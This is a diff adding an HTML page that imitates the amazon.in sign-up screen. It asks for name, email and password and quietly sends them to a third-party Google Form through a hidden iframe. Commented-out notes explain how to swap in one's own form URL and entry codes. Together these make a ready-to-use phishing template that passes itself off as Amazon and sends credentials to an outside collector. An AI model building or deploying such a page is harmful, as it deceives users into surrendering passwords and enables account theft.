@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Trial</title>
+
+    <link rel="stylesheet" href="signinstyle.css" />
+  </head>
+
+  <body>
+    <div style="margin-top: 100px">
+      <div class="parent">
+        <div class="name">
+          <a class="setc" href="new.html"> amazon.in</a>
+        </div>
+      </div>
+      <div class="parent2">
+        <div class="child1"></div>
+        <div class="child2">
+          <div>Sign-up</div>
+          <div class="email">
+            <div>Name</div>
+          </div>
+          <form
+            action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScIWfljDJCVJ7OaA_YdNxWbuHepecWuax7wbFFHpOxU5eF4eA/formResponse"
+            method="post"
+            target="hidden_iframe"
+            onsubmit="submitted=true"
+          >
+            <input
+              class="input"
+              type="text"
+              name="entry.2045028356"
+              id="uname"
+            />
+            <p class="btn11" id="usererror"></p>
+            <div class="email">
+              <div>Email id</div>
+            </div>
+            <input
+              class="input"
+              type="text"
+              name="entry.712906628"
+              id="email"
+            />
+            <p class="btn11" id="usererror2"></p>
+            <div class="email">
+              <div>Password</div>
+            </div>
+            <input class="input" type="text" name="entry.919925057" id="pass" />
+            <p class="btn11" id="usererror3"></p>
+
+            <input
+              class="btn"
+              type="Button"
+              value="continue"
+              onclick="validateform()"
+            />
+          </form>
+          <div>
+            <div class="disc">
+              <div class="inst">By continuing, you agree to Amazon's</div>
+
+              <div class="condition">
+                <a class="tnc" href="">Conditions of Use</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="child3"></div>
+      </div>
+    </div>
+    <script type="text/javascript">
+      var submitted = false;
+    </script>
+    <iframe
+      name="hidden_iframe"
+      id="hidden_iframe"
+      style="display: none"
+      onload="if(submitted){ }"
+    ></iframe>
+    <script>
+      let username = document.getElementById("uname");
+      let email1 = document.getElementById("email");
+      let pass1 = document.getElementById("pass");
+      let flag = 1;
+
+      function validateform() {
+        if (username.value == "") {
+          document.getElementById("usererror").innerHTML =
+            "*please enter your name";
+          flag = 0;
+        } else {
+          document.getElementById("usererror").innerHTML = "";
+          flag = 1;
+        }
+
+        if (email1.value == "") {
+          document.getElementById("usererror2").innerHTML =
+            "*please enter your email";
+          flag = 0;
+        } else {
+          document.getElementById("usererror2").innerHTML = "";
+          flag = 1;
+        }
+        if (pass1.value == "") {
+          document.getElementById("usererror3").innerHTML =
+            "*please enter your password";
+          flag = 0;
+        } else {
+          document.getElementById("usererror3").innerHTML = "";
+          flag = 1;
+        }
+        if (flag) {
+          return true;
+        } else {
+          return false;
+        }
+      }
+    </script>
+  </body>
+</html>
+
+<!-- <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link
+      href="https://docs.google.com/forms/u/0/d/e/1FAIpQLScIWfljDJCVJ7OaA_YdNxWbuHepecWuax7wbFFHpOxU5eF4eA/formResponse"
+      rel="stylesheet"
+      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
+      crossorigin="anonymous"
+    />
+    <title>Sign in</title>
+    <!-- CSS -->
+<!-- <style>
+      * {
+        margin: 0;
+        padding: 0;
+        font-family: sans-serif;
+      }
+      body {
+        margin: 25px 55px;
+      }
+      .myform input {
+        padding: 10px 15px;
+        font-size: 16px;
+        margin: 5px 0px;
+      }
+    </style>
+  </head>
+  <body>
+    <script type="text/javascript">
+      var submitted = false;
+    </script>
+    <iframe
+      name="hidden_iframe"
+      id="hidden_iframe"
+      style="display: none"
+      onload="if(submitted){ }"
+    ></iframe>
+                My Form-->
+<!-- <div class="d-flex justify-content-center" style="margin-top: 180px">
+      <div class="bg-danger w-25">
+        <p class="fw-bold fs-1 text-center mb-0 mt-4">Amazon.in</p> -->
+
+<!-- FORM 
+1. Replace # of form action with your google form s url
+2. Replace # of name with entry code.
+Note : Now a days google forms entry codes are not availabe on source so for that kindly generate a pre-filled link in order to get the entry codes.
+-->
+<!-- <form
+          action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSde55zTDbY6XHfB1fgTjUzt6XKOKdLDS7QwYlYNX_gA6QoQrw/formResponse"
+          method="post"
+          target="hidden_iframe"
+          onsubmit="submitted=true"
+          class="myform text-center"
+        >
+          <input
+            type="text"
+            placeholder="Your Name"
+            name="entry.2045028356"
+          /><br />
+          <input
+            type="text"
+            placeholder="Email ID"
+            name="entry.712906628"
+          /><br />
+          <input
+            type="text"
+            class="justify-content-center"
+            placeholder="Comment"
+            name="entry.919925057"
+          /><br />
+          <input
+            type="submit"
+            class="btn btn-primary text-center"
+            value="Submit"
+          />
+        </form>
+
+        <br />
+        <br />
+      </div>
+    </div>
+  </body>
+</html> -->
